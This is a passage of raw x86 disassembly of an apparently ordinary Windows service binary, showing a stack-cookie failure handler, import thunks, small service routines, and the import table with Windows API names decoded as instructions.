 100309d:	8b ec                	mov    %esp,%ebp
 100309f:	81 ec 30 03 00 00    	sub    $0x330,%esp
 10030a5:	57                   	push   %edi
 10030a6:	89 85 d8 fd ff ff    	mov    %eax,-0x228(%ebp)
 10030ac:	89 8d d4 fd ff ff    	mov    %ecx,-0x22c(%ebp)
 10030b2:	89 95 d0 fd ff ff    	mov    %edx,-0x230(%ebp)
 10030b8:	89 9d cc fd ff ff    	mov    %ebx,-0x234(%ebp)
 10030be:	89 b5 c8 fd ff ff    	mov    %esi,-0x238(%ebp)
 10030c4:	89 bd c4 fd ff ff    	mov    %edi,-0x23c(%ebp)
 10030ca:	66 8c 95 f0 fd ff ff 	data16 mov %ss,-0x210(%ebp)
 10030d1:	66 8c 8d e4 fd ff ff 	data16 mov %cs,-0x21c(%ebp)
 10030d8:	66 8c 9d c0 fd ff ff 	data16 mov %ds,-0x240(%ebp)
 10030df:	66 8c 85 bc fd ff ff 	data16 mov %es,-0x244(%ebp)
 10030e6:	66 8c a5 b8 fd ff ff 	data16 mov %fs,-0x248(%ebp)
 10030ed:	66 8c ad b4 fd ff ff 	data16 mov %gs,-0x24c(%ebp)
 10030f4:	9c                   	pushf
 10030f5:	8f 85 e8 fd ff ff    	pop    -0x218(%ebp)
 10030fb:	c7 85 28 fd ff ff 01 	movl   $0x10001,-0x2d8(%ebp)
 1003102:	00 01 00 
 1003105:	8b 45 04             	mov    0x4(%ebp),%eax
 1003108:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
 100310e:	8d 45 04             	lea    0x4(%ebp),%eax
 1003111:	89 85 ec fd ff ff    	mov    %eax,-0x214(%ebp)
 1003117:	8d 45 04             	lea    0x4(%ebp),%eax
 100311a:	8b 40 fc             	mov    -0x4(%eax),%eax
 100311d:	89 85 dc fd ff ff    	mov    %eax,-0x224(%ebp)
 1003123:	6a 14                	push   $0x14
 1003125:	59                   	pop    %ecx
 1003126:	33 c0                	xor    %eax,%eax
 1003128:	8d bd d0 fc ff ff    	lea    -0x330(%ebp),%edi
 100312e:	f3 ab                	rep stos %eax,%es:(%edi)
 1003130:	c7 85 d0 fc ff ff 09 	movl   $0xc0000409,-0x330(%ebp)
 1003137:	04 00 c0 
 100313a:	8b 45 04             	mov    0x4(%ebp),%eax
 100313d:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
 1003143:	8d 85 d0 fc ff ff    	lea    -0x330(%ebp),%eax
 1003149:	89 45 f8             	mov    %eax,-0x8(%ebp)
 100314c:	8d 85 28 fd ff ff    	lea    -0x2d8(%ebp),%eax
 1003152:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1003155:	a1 44 40 00 01       	mov    0x1004044,%eax
 100315a:	89 85 20 fd ff ff    	mov    %eax,-0x2e0(%ebp)
 1003160:	a1 90 40 00 01       	mov    0x1004090,%eax
 1003165:	89 85 24 fd ff ff    	mov    %eax,-0x2dc(%ebp)
 100316b:	6a 00                	push   $0x0
 100316d:	ff 15 94 10 00 01    	call   *0x1001094
 1003173:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1003176:	50                   	push   %eax
 1003177:	ff 15 bc 10 00 01    	call   *0x10010bc
 100317d:	68 02 05 00 00       	push   $0x502
 1003182:	ff 15 50 10 00 01    	call   *0x1001050
 1003188:	50                   	push   %eax
 1003189:	ff 15 b8 10 00 01    	call   *0x10010b8
 100318f:	5f                   	pop    %edi
 1003190:	c9                   	leave
 1003191:	c3                   	ret
 1003192:	90                   	nop
 1003193:	90                   	nop
 1003194:	90                   	nop
 1003195:	90                   	nop
 1003196:	90                   	nop
 1003197:	ff 25 c8 10 00 01    	jmp    *0x10010c8
 100319d:	90                   	nop
 100319e:	90                   	nop
 100319f:	90                   	nop
 10031a0:	90                   	nop
 10031a1:	90                   	nop
 10031a2:	b8 00 40 00 01       	mov    $0x1004000,%eax
 10031a7:	eb 00                	jmp    0x10031a9
 10031a9:	51                   	push   %ecx
 10031aa:	52                   	push   %edx
 10031ab:	50                   	push   %eax
 10031ac:	68 68 32 00 01       	push   $0x1003268
 10031b1:	e8 99 f4 ff ff       	call   0x100264f
 10031b6:	5a                   	pop    %edx
 10031b7:	59                   	pop    %ecx
 10031b8:	ff e0                	jmp    *%eax
 10031ba:	90                   	nop
 10031bb:	90                   	nop
 10031bc:	90                   	nop
 10031bd:	90                   	nop
 10031be:	90                   	nop
 10031bf:	ff 25 00 40 00 01    	jmp    *0x1004000
 10031c5:	90                   	nop
 10031c6:	90                   	nop
 10031c7:	90                   	nop
 10031c8:	90                   	nop
 10031c9:	90                   	nop
 10031ca:	8b ff                	mov    %edi,%edi
 10031cc:	55                   	push   %ebp
 10031cd:	8b ec                	mov    %esp,%ebp
 10031cf:	56                   	push   %esi
 10031d0:	57                   	push   %edi
 10031d1:	6a 01                	push   $0x1
 10031d3:	6a 00                	push   $0x0
 10031d5:	ff 75 08             	push   0x8(%ebp)
 10031d8:	ff 15 30 11 00 01    	call   *0x1001130
 10031de:	be 74 40 00 01       	mov    $0x1004074,%esi
 10031e3:	56                   	push   %esi
 10031e4:	8b f8                	mov    %eax,%edi
 10031e6:	ff 15 68 10 00 01    	call   *0x1001068
 10031ec:	ff 0d 70 40 00 01    	decl   0x1004070
 10031f2:	75 0e                	jne    0x1003202
 10031f4:	6a 00                	push   $0x0
 10031f6:	ff 15 44 11 00 01    	call   *0x1001144
 10031fc:	ff 15 28 11 00 01    	call   *0x1001128
 1003202:	56                   	push   %esi
 1003203:	ff 15 60 10 00 01    	call   *0x1001060
 1003209:	57                   	push   %edi
 100320a:	ff 15 40 11 00 01    	call   *0x1001140
 1003210:	5f                   	pop    %edi
 1003211:	5e                   	pop    %esi
 1003212:	5d                   	pop    %ebp
 1003213:	c2 04 00             	ret    $0x4
 1003216:	90                   	nop
 1003217:	90                   	nop
 1003218:	90                   	nop
 1003219:	90                   	nop
 100321a:	90                   	nop
 100321b:	8b ff                	mov    %edi,%edi
 100321d:	55                   	push   %ebp
 100321e:	8b ec                	mov    %esp,%ebp
 1003220:	56                   	push   %esi
 1003221:	57                   	push   %edi
 1003222:	6a 01                	push   $0x1
 1003224:	6a 00                	push   $0x0
 1003226:	ff 75 08             	push   0x8(%ebp)
 1003229:	ff 15 24 11 00 01    	call   *0x1001124
 100322f:	be 74 40 00 01       	mov    $0x1004074,%esi
 1003234:	56                   	push   %esi
 1003235:	8b f8                	mov    %eax,%edi
 1003237:	ff 15 68 10 00 01    	call   *0x1001068
 100323d:	ff 0d 70 40 00 01    	decl   0x1004070
 1003243:	75 0e                	jne    0x1003253
 1003245:	6a 00                	push   $0x0
 1003247:	ff 15 44 11 00 01    	call   *0x1001144
 100324d:	ff 15 28 11 00 01    	call   *0x1001128
 1003253:	56                   	push   %esi
 1003254:	ff 15 60 10 00 01    	call   *0x1001060
 100325a:	57                   	push   %edi
 100325b:	ff 15 40 11 00 01    	call   *0x1001140
 1003261:	5f                   	pop    %edi
 1003262:	5e                   	pop    %esi
 1003263:	5d                   	pop    %ebp
 1003264:	c2 04 00             	ret    $0x4
 1003267:	90                   	nop
 1003268:	01 00                	add    %eax,(%eax)
 100326a:	00 00                	add    %al,(%eax)
 100326c:	d0 32                	shlb   $1,(%edx)
 100326e:	00 00                	add    %al,(%eax)
 1003270:	ec                   	in     (%dx),%al
 1003271:	41                   	inc    %ecx
 1003272:	00 00                	add    %al,(%eax)
 1003274:	00 40 00             	add    %al,0x0(%eax)
 1003277:	00 0c 33             	add    %cl,(%ebx,%esi,1)
	...
 1003286:	00 00                	add    %al,(%eax)
 1003288:	01 00                	add    %eax,(%eax)
 100328a:	00 00                	add    %al,(%eax)
 100328c:	00 33                	add    %dh,(%ebx)
 100328e:	00 00                	add    %al,(%eax)
 1003290:	98                   	cwtl
 1003291:	40                   	inc    %eax
 1003292:	00 00                	add    %al,(%eax)
 1003294:	08 40 00             	or     %al,0x0(%eax)
 1003297:	00 14 33             	add    %dl,(%ebx,%esi,1)
	...
 10032c6:	00 00                	add    %al,(%eax)
 10032c8:	90                   	nop
 10032c9:	90                   	nop
 10032ca:	90                   	nop
 10032cb:	90                   	nop
 10032cc:	90                   	nop
 10032cd:	90                   	nop
 10032ce:	90                   	nop
 10032cf:	90                   	nop
 10032d0:	4e                   	dec    %esi
 10032d1:	45                   	inc    %ebp
 10032d2:	54                   	push   %esp
 10032d3:	41                   	inc    %ecx
 10032d4:	50                   	push   %eax
 10032d5:	49                   	dec    %ecx
 10032d6:	33 32                	xor    (%edx),%esi
 10032d8:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 10032db:	6c                   	insb   (%dx),%es:(%edi)
 10032dc:	00 5a 90             	add    %bl,-0x70(%edx)
 10032df:	90                   	nop
 10032e0:	90                   	nop
 10032e1:	90                   	nop
 10032e2:	90                   	nop
 10032e3:	90                   	nop
 10032e4:	90                   	nop
 10032e5:	90                   	nop
 10032e6:	90                   	nop
 10032e7:	90                   	nop
 10032e8:	90                   	nop
 10032e9:	90                   	nop
 10032ea:	90                   	nop
 10032eb:	90                   	nop
 10032ec:	90                   	nop
 10032ed:	90                   	nop
 10032ee:	90                   	nop
 10032ef:	90                   	nop
 10032f0:	90                   	nop
 10032f1:	90                   	nop
 10032f2:	90                   	nop
 10032f3:	90                   	nop
 10032f4:	90                   	nop
 10032f5:	90                   	nop
 10032f6:	90                   	nop
 10032f7:	90                   	nop
 10032f8:	90                   	nop
 10032f9:	90                   	nop
 10032fa:	90                   	nop
 10032fb:	90                   	nop
 10032fc:	90                   	nop
 10032fd:	90                   	nop
 10032fe:	90                   	nop
 10032ff:	90                   	nop
 1003300:	6f                   	outsl  %ds:(%esi),(%dx)
 1003301:	6c                   	insb   (%dx),%es:(%edi)
 1003302:	65 33 32             	xor    %gs:(%edx),%esi
 1003305:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 1003308:	6c                   	insb   (%dx),%es:(%edi)
 1003309:	00 90 90 20 33 00    	add    %dl,0x332090(%eax)
 100330f:	00 00                	add    %al,(%eax)
 1003311:	00 00                	add    %al,(%eax)
 1003313:	00 2a                	add    %ch,(%edx)
 1003315:	33 00                	xor    (%eax),%eax
 1003317:	00 3c 33             	add    %bh,(%ebx,%esi,1)
	...
 1003322:	4e                   	dec    %esi
 1003323:	65 74 62             	gs je  0x1003388
 1003326:	69 6f 73 00 00 00 43 	imul   $0x43000000,0x73(%edi),%ebp
 100332d:	6f                   	outsl  %ds:(%esi),(%dx)
 100332e:	49                   	dec    %ecx
 100332f:	6e                   	outsb  %ds:(%esi),(%dx)
 1003330:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
 1003337:	65 
 1003338:	45                   	inc    %ebp
 1003339:	78 00                	js     0x100333b
 100333b:	32 00                	xor    (%eax),%al
 100333d:	00 43 6f             	add    %al,0x6f(%ebx)
 1003340:	49                   	dec    %ecx
 1003341:	6e                   	outsb  %ds:(%esi),(%dx)
 1003342:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
 1003349:	65 
 100334a:	53                   	push   %ebx
 100334b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
 100334f:	69 74 79 00 00 ec 33 	imul   $0x33ec00,0x0(%ecx,%edi,2),%esi
 1003356:	00 
 1003357:	00 ff                	add    %bh,%bh
 1003359:	ff                   	(bad)
 100335a:	ff                   	(bad)
 100335b:	ff                   	(bad)
 100335c:	ff                   	(bad)
 100335d:	ff                   	(bad)
 100335e:	ff                   	(bad)
 100335f:	ff                   	(bad)
 1003360:	b8 33 00 00 00       	mov    $0x33,%eax
 1003365:	10 00                	adc    %al,(%eax)
 1003367:	00 28                	add    %ch,(%eax)
 1003369:	34 00                	xor    $0x0,%al
 100336b:	00 ff                	add    %bh,%bh
 100336d:	ff                   	(bad)
 100336e:	ff                   	(bad)
 100336f:	ff                   	(bad)
 1003370:	ff                   	(bad)
 1003371:	ff                   	(bad)
 1003372:	ff                   	(bad)
 1003373:	ff c6                	inc    %esi
 1003375:	33 00                	xor    (%eax),%eax
 1003377:	00 3c 10             	add    %bh,(%eax,%edx,1)
 100337a:	00 00                	add    %al,(%eax)
 100337c:	bc 34 00 00 ff       	mov    $0xff000034,%esp
 1003381:	ff                   	(bad)
 1003382:	ff                   	(bad)
 1003383:	ff                   	(bad)
 1003384:	ff                   	(bad)
 1003385:	ff                   	(bad)
 1003386:	ff                   	(bad)
 1003387:	ff d4                	call   *%esp
 1003389:	33 00                	xor    (%eax),%eax
 100338b:	00 d0                	add    %dl,%al
 100338d:	10 00                	adc    %al,(%eax)
 100338f:	00 10                	add    %dl,(%eax)
 1003391:	35 00 00 ff ff       	xor    $0xffff0000,%eax
 1003396:	ff                   	(bad)
 1003397:	ff                   	(bad)
 1003398:	ff                   	(bad)
 1003399:	ff                   	(bad)
 100339a:	ff                   	(bad)
 100339b:	ff                   	lcall  (bad)
 100339c:	de 33                	fidivs (%ebx)
 100339e:	00 00                	add    %al,(%eax)
 10033a0:	24 11                	and    $0x11,%al
	...
 10033b6:	00 00                	add    %al,(%eax)
 10033b8:	41                   	inc    %ecx
 10033b9:	44                   	inc    %esp
 10033ba:	56                   	push   %esi
 10033bb:	41                   	inc    %ecx
 10033bc:	50                   	push   %eax
 10033bd:	49                   	dec    %ecx
 10033be:	33 32                	xor    (%edx),%esi
 10033c0:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 10033c3:	6c                   	insb   (%dx),%es:(%edi)
 10033c4:	00 00                	add    %al,(%eax)
 10033c6:	4b                   	dec    %ebx
 10033c7:	45                   	inc    %ebp
 10033c8:	52                   	push   %edx
 10033c9:	4e                   	dec    %esi
 10033ca:	45                   	inc    %ebp
 10033cb:	4c                   	dec    %esp
 10033cc:	33 32                	xor    (%edx),%esi
 10033ce:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 10033d1:	6c                   	insb   (%dx),%es:(%edi)
 10033d2:	00 00                	add    %al,(%eax)
 10033d4:	6e                   	outsb  %ds:(%esi),(%dx)
 10033d5:	74 64                	je     0x100343b
 10033d7:	6c                   	insb   (%dx),%es:(%edi)
 10033d8:	6c                   	insb   (%dx),%es:(%edi)
 10033d9:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 10033dc:	6c                   	insb   (%dx),%es:(%edi)
 10033dd:	00 52 50             	add    %dl,0x50(%edx)
 10033e0:	43                   	inc    %ebx
 10033e1:	52                   	push   %edx
 10033e2:	54                   	push   %esp
 10033e3:	34 2e                	xor    $0x2e,%al
 10033e5:	64 6c                	fs insb (%dx),%es:(%edi)
 10033e7:	6c                   	insb   (%dx),%es:(%edi)
 10033e8:	00 00                	add    %al,(%eax)
 10033ea:	90                   	nop
 10033eb:	90                   	nop
 10033ec:	38 35 00 00 4c 35    	cmp    %dh,0x354c0000
 10033f2:	00 00                	add    %al,(%eax)
 10033f4:	68 35 00 00 7c       	push   $0x7c000035
 10033f9:	35 00 00 9a 35       	xor    $0x359a0000,%eax
 10033fe:	00 00                	add    %al,(%eax)
 1003400:	b8 35 00 00 d8       	mov    $0xd8000035,%eax
 1003405:	35 00 00 ee 35       	xor    $0x35ee0000,%eax
 100340a:	00 00                	add    %al,(%eax)
 100340c:	02 36                	add    (%esi),%dh
 100340e:	00 00                	add    %al,(%eax)
 1003410:	14 36                	adc    $0x36,%al
 1003412:	00 00                	add    %al,(%eax)
 1003414:	28 36                	sub    %dh,(%esi)
 1003416:	00 00                	add    %al,(%eax)
 1003418:	46                   	inc    %esi
 1003419:	36 00 00             	add    %al,%ss:(%eax)
 100341c:	54                   	push   %esp
 100341d:	36 00 00             	add    %al,%ss:(%eax)
 1003420:	64 36 00 00          	fs add %al,%ss:(%eax)
 1003424:	00 00                	add    %al,(%eax)
 1003426:	00 00                	add    %al,(%eax)
 1003428:	82 36 00             	xorb   $0x0,(%esi)
 100342b:	00 8e 36 00 00 9e    	add    %cl,-0x61ffffca(%esi)
 1003431:	36 00 00             	add    %al,%ss:(%eax)
 1003434:	b4 36                	mov    $0x36,%ah
 1003436:	00 00                	add    %al,(%eax)
 1003438:	c0 36 00             	shlb   $0x0,(%esi)
 100343b:	00 cc                	add    %cl,%ah
 100343d:	36 00 00             	add    %al,%ss:(%eax)
 1003440:	e0 36                	loopne 0x1003478
 1003442:	00 00                	add    %al,(%eax)
 1003444:	f4                   	hlt
 1003445:	36 00 00             	add    %al,%ss:(%eax)
 1003448:	06                   	push   %es
 1003449:	37                   	aaa
 100344a:	00 00                	add    %al,(%eax)
 100344c:	18 37                	sbb    %dh,(%edi)
 100344e:	00 00                	add    %al,(%eax)
 1003450:	30 37                	xor    %dh,(%edi)
 1003452:	00 00                	add    %al,(%eax)
 1003454:	3c 37                	cmp    $0x37,%al
 1003456:	00 00                	add    %al,(%eax)
 1003458:	54                   	push   %esp
 1003459:	37                   	aaa
 100345a:	00 00                	add    %al,(%eax)
 100345c:	64 37                	fs aaa
 100345e:	00 00                	add    %al,(%eax)
 1003460:	72 37                	jb     0x1003499
 1003462:	00 00                	add    %al,(%eax)
 1003464:	7e 37                	jle    0x100349d
 1003466:	00 00                	add    %al,(%eax)
 1003468:	9a 37 00 00 a6 37 00 	lcall  $0x37,$0xa6000037
 100346f:	00 b4 37 00 00 c6 37 	add    %dh,0x37c60000(%edi,%esi,1)
 1003476:	00 00                	add    %al,(%eax)
 1003478:	e2 37                	loop   0x10034b1
 100347a:	00 00                	add    %al,(%eax)
 100347c:	f4                   	hlt
 100347d:	37                   	aaa
 100347e:	00 00                	add    %al,(%eax)
 1003480:	04 38                	add    $0x38,%al
 1003482:	00 00                	add    %al,(%eax)
 1003484:	22 38                	and    (%eax),%bh
 1003486:	00 00                	add    %al,(%eax)
 1003488:	40                   	inc    %eax
 1003489:	38 00                	cmp    %al,(%eax)
 100348b:	00 5e 38             	add    %bl,0x38(%esi)
 100348e:	00 00                	add    %al,(%eax)
 1003490:	6e                   	outsb  %ds:(%esi),(%dx)
 1003491:	38 00                	cmp    %al,(%eax)
 1003493:	00 88 38 00 00 98    	add    %cl,-0x67ffffc8(%eax)
 1003499:	38 00                	cmp    %al,(%eax)
 100349b:	00 ae 38 00 00 c4    	add    %ch,-0x3bffffc8(%esi)
 10034a1:	38 00                	cmp    %al,(%eax)
 10034a3:	00 de                	add    %bl,%dh
 10034a5:	38 00                	cmp    %al,(%eax)
 10034a7:	00 f2                	add    %dh,%dl
 10034a9:	38 00                	cmp    %al,(%eax)
 10034ab:	00 0e                	add    %cl,(%esi)
 10034ad:	39 00                	cmp    %eax,(%eax)
 10034af:	00 1c 39             	add    %bl,(%ecx,%edi,1)
 10034b2:	00 00                	add    %al,(%eax)
 10034b4:	28 39                	sub    %bh,(%ecx)
 10034b6:	00 00                	add    %al,(%eax)
 10034b8:	00 00                	add    %al,(%eax)
 10034ba:	00 00                	add    %al,(%eax)
 10034bc:	40                   	inc    %eax
 10034bd:	39 00                	cmp    %eax,(%eax)
 10034bf:	00 58 39             	add    %bl,0x39(%eax)
 10034c2:	00 00                	add    %al,(%eax)
 10034c4:	66 39 00             	cmp    %ax,(%eax)
 10034c7:	00 72 39             	add    %dh,0x39(%edx)
 10034ca:	00 00                	add    %al,(%eax)
 10034cc:	7c 39                	jl     0x1003507
 10034ce:	00 00                	add    %al,(%eax)
 10034d0:	86 39                	xchg   %bh,(%ecx)
 10034d2:	00 00                	add    %al,(%eax)
 10034d4:	98                   	cwtl
 10034d5:	39 00                	cmp    %eax,(%eax)
 10034d7:	00 b2 39 00 00 ca    	add    %dh,-0x35ffffc7(%edx)
 10034dd:	39 00                	cmp    %eax,(%eax)
 10034df:	00 de                	add    %bl,%dh
 10034e1:	39 00                	cmp    %eax,(%eax)
 10034e3:	00 f6                	add    %dh,%dh
 10034e5:	39 00                	cmp    %eax,(%eax)
 10034e7:	00 0c 3a             	add    %cl,(%edx,%edi,1)
 10034ea:	00 00                	add    %al,(%eax)
 10034ec:	16                   	push   %ss
 10034ed:	3a 00                	cmp    (%eax),%al
 10034ef:	00 30                	add    %dh,(%eax)
 10034f1:	3a 00                	cmp    (%eax),%al
 10034f3:	00 50 3a             	add    %dl,0x3a(%eax)
 10034f6:	00 00                	add    %al,(%eax)
 10034f8:	6a 3a                	push   $0x3a
 10034fa:	00 00                	add    %al,(%eax)
 10034fc:	76 3a                	jbe    0x1003538
 10034fe:	00 00                	add    %al,(%eax)
 1003500:	8a 3a                	mov    (%edx),%bh
 1003502:	00 00                	add    %al,(%eax)
 1003504:	94                   	xchg   %eax,%esp
 1003505:	3a 00                	cmp    (%eax),%al
 1003507:	00 b2 3a 00 00 00    	add    %dh,0x3a(%edx)
 100350d:	00 00                	add    %al,(%eax)
 100350f:	00 c0                	add    %al,%al
 1003511:	3a 00                	cmp    (%eax),%al
 1003513:	00 da                	add    %bl,%dl
 1003515:	3a 00                	cmp    (%eax),%al
 1003517:	00 f4                	add    %dh,%ah
 1003519:	3a 00                	cmp    (%eax),%al
 100351b:	00 10                	add    %dl,(%eax)
 100351d:	3b 00                	cmp    (%eax),%eax
 100351f:	00 28                	add    %ch,(%eax)
 1003521:	3b 00                	cmp    (%eax),%eax
 1003523:	00 3a                	add    %bh,(%edx)
 1003525:	3b 00                	cmp    (%eax),%eax
 1003527:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
 100352b:	00 6a 3b             	add    %ch,0x3b(%edx)
 100352e:	00 00                	add    %al,(%eax)
 1003530:	80 3b 00             	cmpb   $0x0,(%ebx)
 1003533:	00 00                	add    %al,(%eax)
 1003535:	00 00                	add    %al,(%eax)
 1003537:	00 ee                	add    %ch,%dh
 1003539:	01 52 65             	add    %edx,0x65(%edx)
 100353c:	67 51                	addr16 push %ecx
 100353e:	75 65                	jne    0x10035a5
 1003540:	72 79                	jb     0x10035bb
 1003542:	56                   	push   %esi
 1003543:	61                   	popa
 1003544:	6c                   	insb   (%dx),%es:(%edi)
 1003545:	75 65                	jne    0x10035ac
 1003547:	45                   	inc    %ebp
 1003548:	78 57                	js     0x10035a1
 100354a:	00 00                	add    %al,(%eax)
 100354c:	30 02                	xor    %al,(%edx)
 100354e:	53                   	push   %ebx
 100354f:	65 74 53             	gs je  0x10035a5
 1003552:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
 1003556:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%ecx,%edi,2),%esi
 100355d:	72 
 100355e:	69 70 74 6f 72 44 61 	imul   $0x6144726f,0x74(%eax),%esi
 1003565:	63 6c 00 21          	arpl   %ebp,0x21(%eax,%eax,1)
 1003569:	02 53 65             	add    0x65(%ebx),%dl
 100356c:	74 45                	je     0x10035b3
 100356e:	6e                   	outsb  %ds:(%esi),(%dx)
 100356f:	74 72                	je     0x10035e3
 1003571:	69 65 73 49 6e 41 63 	imul   $0x63416e49,0x73(%ebp),%esp
 1003578:	6c                   	insb   (%dx),%es:(%edi)
 1003579:	57                   	push   %edi
 100357a:	00 00                	add    %al,(%eax)
 100357c:	31 02                	xor    %eax,(%edx)
 100357e:	53                   	push   %ebx
 100357f:	65 74 53             	gs je  0x10035d5
 1003582:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
 1003586:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%ecx,%edi,2),%esi
 100358d:	72 
 100358e:	69 70 74 6f 72 47 72 	imul   $0x7247726f,0x74(%eax),%esi
 1003595:	6f                   	outsl  %ds:(%esi),(%dx)
 1003596:	75 70                	jne    0x1003608
 1003598:	00 00                	add    %al,(%eax)
 100359a:	32 02                	xor    (%edx),%al
 100359c:	53                   	push   %ebx
 100359d:	65 74 53             	gs je  0x10035f3
 10035a0:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
 10035a4:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%ecx,%edi,2),%esi
 10035ab:	72 
 10035ac:	69 70 74 6f 72 4f 77 	imul   $0x774f726f,0x74(%eax),%esi
 10035b3:	6e                   	outsb  %ds:(%esi),(%dx)
 10035b4:	65 72 00             	gs jb  0x10035b7
 10035b7:	00 32                	add    %dh,(%edx)
 10035b9:	01 49 6e             	add    %ecx,0x6e(%ecx)
 10035bc:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
 10035c3:	65 
 10035c4:	53                   	push   %ebx
 10035c5:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
 10035c9:	69 74 79 44 65 73 63 	imul   $0x72637365,0x44(%ecx,%edi,2),%esi
 10035d0:	72 
 10035d1:	69 70 74 6f 72 00 00 	imul   $0x726f,0x74(%eax),%esi
 10035d8:	19 01                	sbb    %eax,(%ecx)
 10035da:	47                   	inc    %edi
 10035db:	65 74 54             	gs je  0x1003632
 10035de:	6f                   	outsl  %ds:(%esi),(%dx)
 10035df:	6b 65 6e 49          	imul   $0x49,0x6e(%ebp),%esp
 10035e3:	6e                   	outsb  %ds:(%esi),(%dx)
 10035e4:	66 6f                	outsw  %ds:(%esi),(%dx)
 10035e6:	72 6d                	jb     0x1003655
 10035e8:	61                   	popa
 10035e9:	74 69                	je     0x1003654
 10035eb:	6f                   	outsl  %ds:(%esi),(%dx)
 10035ec:	6e                   	outsb  %ds:(%esi),(%dx)
 10035ed:	00 aa 01 4f 70 65    	add    %ch,0x65704f01(%edx)
 10035f3:	6e                   	outsb  %ds:(%esi),(%dx)
 10035f4:	50                   	push   %eax
 10035f5:	72 6f                	jb     0x1003666
 10035f7:	63 65 73             	arpl   %esp,0x73(%ebp)
 10035fa:	73 54                	jae    0x1003650
 10035fc:	6f                   	outsl  %ds:(%esi),(%dx)
 10035fd:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
 1003601:	00 af 01 4f 70 65    	add    %ch,0x65704f01(%edi)
 1003607:	6e                   	outsb  %ds:(%esi),(%dx)
 1003608:	54                   	push   %esp
 1003609:	68 72 65 61 64       	push   $0x64616572
 100360e:	54                   	push   %esp
 100360f:	6f                   	outsl  %ds:(%esi),(%dx)
 1003610:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
 1003614:	3a 02                	cmp    (%edx),%al
 1003616:	53                   	push   %ebx
 1003617:	65 74 53             	gs je  0x100366d
 100361a:	65 72 76             	gs jb  0x1003693
 100361d:	69 63 65 53 74 61 74 	imul   $0x74617453,0x65(%ebx),%esp
 1003624:	75 73                	jne    0x1003699
 1003626:	00 00                	add    %al,(%eax)
 1003628:	05 02 52 65 67       	add    $0x67655202,%eax
 100362d:	69 73 74 65 72 53 65 	imul   $0x65537265,0x74(%ebx),%esi
 1003634:	72 76                	jb     0x10036ac
 1003636:	69 63 65 43 74 72 6c 	imul   $0x6c727443,0x65(%ebx),%esp
 100363d:	48                   	dec    %eax
 100363e:	61                   	popa
 100363f:	6e                   	outsb  %ds:(%esi),(%dx)
 1003640:	64 6c                	fs insb (%dx),%es:(%edi)
 1003642:	65 72 57             	gs jb  0x100369c
 1003645:	00 ca                	add    %cl,%dl
 1003647:	01 52 65             	add    %edx,0x65(%edx)
 100364a:	67 43                	addr16 inc %ebx
 100364c:	6c                   	insb   (%dx),%es:(%edi)
 100364d:	6f                   	outsl  %ds:(%esi),(%dx)
 100364e:	73 65                	jae    0x10036b5
 1003650:	4b                   	dec    %ebx
 1003651:	65 79 00             	gs jns 0x1003654
 1003654:	e4 01                	in     $0x1,%al
 1003656:	52                   	push   %edx
 1003657:	65 67 4f             	gs addr16 dec %edi
 100365a:	70 65                	jo     0x10036c1
 100365c:	6e                   	outsb  %ds:(%esi),(%dx)
 100365d:	4b                   	dec    %ebx
 100365e:	65 79 45             	gs jns 0x10036a6
 1003661:	78 57                	js     0x10036ba
 1003663:	00 41 02             	add    %al,0x2(%ecx)
 1003666:	53                   	push   %ebx
 1003667:	74 61                	je     0x10036ca
 1003669:	72 74                	jb     0x10036df
 100366b:	53                   	push   %ebx
 100366c:	65 72 76             	gs jb  0x10036e5
 100366f:	69 63 65 43 74 72 6c 	imul   $0x6c727443,0x65(%ebx),%esp
 1003676:	44                   	inc    %esp
 1003677:	69 73 70 61 74 63 68 	imul   $0x68637461,0x70(%ebx),%esi
 100367e:	65 72 57             	gs jb  0x10036d8
 1003681:	00 08                	add    %cl,(%eax)
 1003683:	02 48 65             	add    0x65(%eax),%cl
 1003686:	61                   	popa
 1003687:	70 46                	jo     0x10036cf
 1003689:	72 65                	jb     0x10036f0
 100368b:	65 00 00             	add    %al,%gs:(%eax)
 100368e:	68 01 47 65 74       	push   $0x74654701
 1003693:	4c                   	dec    %esp
 1003694:	61                   	popa
 1003695:	73 74                	jae    0x100370b
 1003697:	45                   	inc    %ebp
 1003698:	72 72                	jb     0x100370c
 100369a:	6f                   	outsl  %ds:(%esi),(%dx)
 100369b:	72 00                	jb     0x100369d
 100369d:	00 7e 03             	add    %bh,0x3(%esi)
 10036a0:	57                   	push   %edi
 10036a1:	69 64 65 43 68 61 72 	imul   $0x54726168,0x43(%ebp,%eiz,2),%esp
 10036a8:	54 
 10036a9:	6f                   	outsl  %ds:(%esi),(%dx)
 10036aa:	4d                   	dec    %ebp
 10036ab:	75 6c                	jne    0x1003719
 10036ad:	74 69                	je     0x1003718
 10036af:	42                   	inc    %edx
 10036b0:	79 74                	jns    0x1003726
 10036b2:	65 00 b4 03 6c 73 74 	add    %dh,%gs:0x7274736c(%ebx,%eax,1)
 10036b9:	72 
 10036ba:	6c                   	insb   (%dx),%es:(%edi)
 10036bb:	65 6e                	outsb  %gs:(%esi),(%dx)
 10036bd:	57                   	push   %edi
 10036be:	00 00                	add    %al,(%eax)
 10036c0:	4b                   	dec    %ebx
 10036c1:	02 4c 6f 63          	add    0x63(%edi,%ebp,2),%cl
 10036c5:	61                   	popa
